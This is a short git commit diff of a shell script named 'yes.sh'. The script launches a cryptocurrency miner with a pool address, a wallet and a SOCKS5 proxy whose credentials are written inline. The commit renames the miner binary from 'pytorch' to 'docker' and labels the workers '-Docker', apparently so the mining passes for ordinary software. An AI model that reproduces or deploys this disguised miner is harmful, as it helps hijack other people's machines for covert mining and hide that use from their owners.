0de03168cc5af288b710aa3d4e72dc2f7afc221e
keratsakti <86237834+keratsakti@users.noreply.github.com>
2021-06-24 22:36:10 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -7,4 +7,4 @@ POOL=stratum+tcp://verushash.na.mine.zpool.ca:6143
 WALLET=MRYuRYQofJEpkcFrSpcrUqmxQfcpFz4wf3
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
 PROXY=socks5://cuan:berhasil123@199.249.170.113:443
-./pytorch -a lyra2z330 -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
+./docker -a verushash -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
